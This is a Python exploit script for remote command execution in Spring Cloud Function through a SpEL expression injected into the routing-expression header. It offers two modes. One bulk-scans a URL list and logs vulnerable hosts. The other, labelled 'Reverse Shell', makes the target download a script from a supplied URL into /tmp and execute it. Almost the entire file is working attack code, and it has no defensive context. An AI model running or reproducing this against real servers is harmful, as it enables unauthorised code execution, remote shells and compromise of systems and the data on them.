import requests
import sys
import threading
import urllib3

urllib3.disable_warnings()


def exploit(url, cmd):
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data = 'test'
    headers = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    all = url + path

    print(url, headers, data)
    req = requests.post(url=all, headers=headers, data=data, verify=False, timeout=3)
    code = req.status_code
    text = req.text
    return req, code, text


def scan(txt, cmd):
    f = open(txt)
    urllist = f.readlines()

    for url in urllist:
        url = url.strip('\n')
        try:
            req, code, text = exploit(url, cmd)
            rsp = '"error":"Internal Server Error"'
            print(req.text)
            if code == 500 and rsp in text:
                print (f'[+] {url} is vulnerable')
                poc_file = open('vulnerable.txt', 'a+')
                poc_file.write(url + '\n')
                poc_file.close()
            else:
                print (f'[-] {url} not vulnerable')

        except requests.exceptions.RequestException:
            print (f'[-] {url} detection timed out')
            continue
        except:
            print (f'[-] {url} error')
            continue


if __name__ == '__main__':
    try:
        if sys.argv[1] and sys.argv[2] is None:
            cmd1 = sys.argv[1]
            t = threading . Thread ( target = scan ( cmd1 , 'id' ) )
            t.start()

        if sys.argv[1] and sys.argv[2]:
            # Reverse Shell
            url = sys.argv[1]
            local_shell_url = sys.argv[2]
            exploit(url, 'rm /tmp/test.py')
            exploit(url, f'wget {local_shell_url} -P /tmp/')
            exploit(url, 'python3 /tmp/test.py')
    except:
        print ('Usage:')
        print('python poc.py url.txt')
        print('Usage OR:')
        print('python poc.py <url> <local_shell_url>')
        pass
